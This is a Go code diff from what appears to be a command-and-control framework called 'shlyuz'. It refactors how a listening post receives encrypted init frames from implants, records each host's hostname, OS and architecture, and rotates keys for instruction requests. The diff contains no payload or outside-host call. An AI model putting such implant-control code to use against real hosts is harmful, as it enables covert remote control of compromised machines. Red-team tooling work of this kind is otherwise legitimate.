@@ -17,8 +17,8 @@ type initFrameArgs struct {
 }
 
 type implantInitFrameArgs struct {
-	manifest component.ImplantManifest
-	ipk      asymmetric.PublicKey
+	Manifest component.ImplantManifest `json:"Manifest"`
+	Ipk      asymmetric.PublicKey      `json:"Ipk"`
 }
 
 type implantInitAckArgs struct {
@@ -37,20 +37,6 @@ type RegisteredClient struct {
 	CurKeyPair asymmetric.AsymmetricKeyPair
 	Interface  transport.TransportMethod
 	Id         string
-}
-
-func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
-	var initFrame instructions.Transaction
-	var initArgs initFrameArgs
-
-	initFrame.Cmd = "ii"
-	initArgs.manifest = component.Manifest
-	argMapping := initFrameArgs{manifest: component.Manifest, lpk: component.InitalKeypair.PubKey}
-	argMap, _ := json.Marshal(argMapping)
-	initFrame.Arg = argMap
-	initFrame.ComponentId = component.Config.Id
-	instructionFrame := instructions.CreateInstructionFrame(initFrame, true)
-	return *instructionFrame
 }
 
 func decodeInitFrame(initFrame []byte) instructions.InstructionFrame {
@@ -80,34 +66,68 @@ func readFromChannel(channel chan []byte) []byte {
 	return data
 }
 
-func RelayInitFrame(shlyuzComponent *component.Component, initFrame instructions.InstructionFrame, shlyuzTransport transport.TransportMethod) *component.Component {
+func readFromTransport(server transport.RegisteredComponent, shlyuzComponent *component.Component) ([]byte, bool, error) {
+	data, boolSuccess, err := server.Transport.Recv(server.CmdChannel)
+	if !boolSuccess {
+		log.Println("failed to receive from channel: ", err)
+		return data, false, err
+	}
+	return data, true, nil
+}
+
+func rekey(frame routine.EncryptedFrame) {
+
+}
+
+func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
+	var initFrame instructions.Transaction
+	var initArgs initFrameArgs
+
+	initFrame.Cmd = "ii"
+	initArgs.manifest = component.Manifest
+	argMapping := initFrameArgs{manifest: component.Manifest, lpk: component.InitalKeypair.PubKey}
+	argMap, _ := json.Marshal(argMapping)
+	initFrame.Arg = argMap
+	initFrame.ComponentId = component.Config.Id
+	instructionFrame := instructions.CreateInstructionFrame(initFrame, true)
+	return *instructionFrame
+}
+
+func RelayInitFrame(client *transport.RegisteredComponent, initFrame instructions.InstructionFrame) *transport.RegisteredComponent {
 	frameMap, _ := json.Marshal(initFrame)
-	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, shlyuzComponent.CurrentImpPubkey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
+	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, client.CurPubKey, client.XorKey, client.InitSignature)
 	// shlyuzComponent.CurrentKeypair = frameKeyPair
-	go writeToChannel(shlyuzComponent.CmdChannel, transmitFrame)
-	// TODO: Do the relaying and retreive the ackFrame
-	boolSuccess, err := shlyuzTransport.Send(shlyuzComponent)
+	// TODO: We can rotate keys here for ourselves - #? KEYROAT
+	// Generate a new keypair for the LP to use
+	client.CmdChannel = make(chan []byte)
+	go writeToChannel(client.CmdChannel, transmitFrame)
+	boolSuccess, err := client.Transport.Send(client.CmdChannel)
 	if !boolSuccess {
 		log.Fatalln("failed to send init: ", err)
 	}
 	log.Println("Sent init frame.")
-	return shlyuzComponent
+	return client
 }
 
-func RetrieveInitFrame(shlyuzComponent *component.Component, shlyuzTransport transport.TransportMethod) (instructions.InstructionFrame, RegisteredClient, bool) {
+func RetrieveInitFrame(client *transport.RegisteredComponent) (instructions.InstructionFrame, transport.RegisteredComponent, bool) {
 	var ackInstruction instructions.InstructionFrame
-	var client RegisteredClient
-	data, boolSuccess, err := shlyuzTransport.Recv(shlyuzComponent)
-	if boolSuccess == false {
+	client.CmdChannel = make(chan []byte)
+	data, boolSuccess, err := client.Transport.Recv(client.CmdChannel)
+	if !boolSuccess {
 		log.Println("failed to receive from channel: ", err)
-		return ackInstruction, client, false
+		return ackInstruction, *client, false
 	}
-	implantInitFrame := routine.UnwrapSealedFrame(data, shlyuzComponent.CurrentKeypair.PrivKey, shlyuzComponent.CurrentKeypair.PubKey, shlyuzComponent.XorKey, shlyuzComponent.Config.InitSignature)
+	implantInitFrame := routine.UnwrapSealedFrame(data, client.CurKeyPair.PrivKey, client.CurKeyPair.PubKey, client.XorKey, client.InitSignature)
 	if implantInitFrame == nil {
 		log.Println("failed to decode initalization frame: ", err)
-		return ackInstruction, client, false
+		return ackInstruction, *client, false
 	}
 	implantInitInstruction := decodeInitFrame(implantInitFrame)
+
+	client.Manifest.Hostname = implantInitInstruction.Uname.Uname.Nodename
+	client.Manifest.Id = implantInitInstruction.ComponentId
+	client.Manifest.Os = implantInitInstruction.Uname.Uname.Sysname
+	client.Manifest.Arch = implantInitInstruction.Uname.Uname.Machine
 
 	// TODO: Register the txid as an event with the dated timestamp
 	// TODO: Check to see if the implant is already registered. Attempt a rekey if so, otherwise ignore host unless considered dead.
@@ -120,76 +140,53 @@ func RetrieveInitFrame(shlyuzComponent *component.Component, shlyuzTransport tra
 		log.Println("[dbginitinstruction]: ", implantInitInstruction)
 		log.Println("[dbginitframe]: ", implantInitFrame)
 		log.Println("[dbgdata]: ", data)
-		return ackInstruction, client, false
+		return ackInstruction, *client, false
 	}
 
-	var implantInit implantInitFrameArgs
-	implantInit.manifest.Implant_hostname = implantInitInstruction.Uname.Uname.Nodename
-	implantInit.manifest.Implant_id = implantInitInstruction.ComponentId
-	implantInit.manifest.Implant_os = implantInitInstruction.Uname.Uname.Sysname
-	implantInit.manifest.Implant_arch = implantInitInstruction.Uname.Uname.Machine
-	implantInit.ipk = shlyuzComponent.CurrentImpPubkey
-
-	client.CurPubKey = implantInit.ipk
-	client.Id = implantInit.manifest.Implant_id
-	client.Interface = shlyuzTransport
-	client.InitArgs = implantInit
+	client.CurPubKey = implantInitInstruction.Pk // TODO: We can rotate keys here - #? KEYROAT
+	client.Id = implantInitInstruction.ComponentId
 
 	// Prepares ack frame
 	var ackTransaction instructions.Transaction
 	ackTransaction.Cmd = "ipi"
-	ackTransaction.ComponentId = shlyuzComponent.ComponentId
+	ackTransaction.ComponentId = client.SelfComponentId
 	ackTransaction.TxId = implantInitInstruction.TxId
 	// TODO: This is a keypair that is unique to the implant
-	// Generate a new keypair for the LP to use
-	client.CurKeyPair = shlyuzComponent.CurrentKeypair
-	// client.CurPubKey = shlyuzComponent.CurrentImpPubkey
-	argMapping := implantInitAckArgs{Lpk: shlyuzComponent.CurrentKeypair.PubKey, Txid: implantInitInstruction.TxId}
-	argMap, _ := json.Marshal(argMapping)
+	// argMapping := implantInitAckArgs{Lpk: client.CurKeyPair.PubKey, Txid: implantInitInstruction.TxId}
+	// argMap, _ := json.Marshal(argMapping)
 	ackInstruction = *instructions.CreateInstructionFrame(ackTransaction, false)
-	ackInstruction.CmdArgs = string(argMap)
-	return ackInstruction, client, true
+	ackInstruction.Pk = client.InitalKeyPair.PubKey
+	// ackInstruction.CmdArgs = string(argMap)
+	return ackInstruction, *client, true
 }
 
-func RetrieveInstructionRequest(shlyuzComponent *component.Component, client *RegisteredClient) (instructions.InstructionFrame, error) {
+func RetrieveInstructionRequest(client *transport.RegisteredComponent) (instructions.InstructionFrame, error) {
 	var requestInstruction instructions.InstructionFrame
-	data, boolSuccess, err := client.Interface.Recv(shlyuzComponent)
+	data, boolSuccess, err := client.Transport.Recv(client.CmdChannel)
 	if !boolSuccess {
 		log.Println("failed to receive from channel: ", err)
 		return requestInstruction, err
 	}
-	requestData := routine.UnwrapTransmitFrame(data, shlyuzComponent.CurrentImpPubkey, shlyuzComponent.CurrentKeypair.PrivKey, shlyuzComponent.XorKey)
+	requestData := routine.UnwrapTransmitFrame(data, client.CurPubKey, client.CurKeyPair.PrivKey, client.XorKey)
 	if requestData == nil {
 		log.Println("failed to decode instruction frame: ", err)
 		return requestInstruction, errors.New("invalid instruction frame")
 	}
 	requestInstruction = decodeInstructionFrame(requestData)
 
-	// We need to parse the args and extract the crypto key
-	// TODO: This should go to a command router
-	var instructionCmdArgs reqCmdArgs
+	// TODO: Send Instruction Frame to command router
+
 	client.CurKeyPair, err = asymmetric.GenerateKeypair()
 	if err != nil {
 		log.Println("failed to generate new keypair")
 	}
-	err = json.Unmarshal([]byte(requestInstruction.CmdArgs), &instructionCmdArgs)
-	if err != nil {
-		log.Println("failed to unmarshal")
-	}
-	client.CurPubKey = instructionCmdArgs.Ipk
+	// Don't need to use this for instruction requests
+	// var instructionCmdArgs reqCmdArgs
+	// err = json.Unmarshal([]byte(requestInstruction.CmdArgs), &instructionCmdArgs)
+	// if err != nil {
+	// 	log.Println("failed to unmarshal")
+	// }
+	client.CurPubKey = requestInstruction.Pk
 
 	return requestInstruction, err
-}
-
-func readFromTransport(client RegisteredClient, shlyuzComponent *component.Component) ([]byte, bool, error) {
-	data, boolSuccess, err := client.Interface.Recv(shlyuzComponent)
-	if !boolSuccess {
-		log.Println("failed to receive from channel: ", err)
-		return data, false, err
-	}
-	return data, true, nil
-}
-
-func rekey(frame routine.EncryptedFrame) {
-
 }
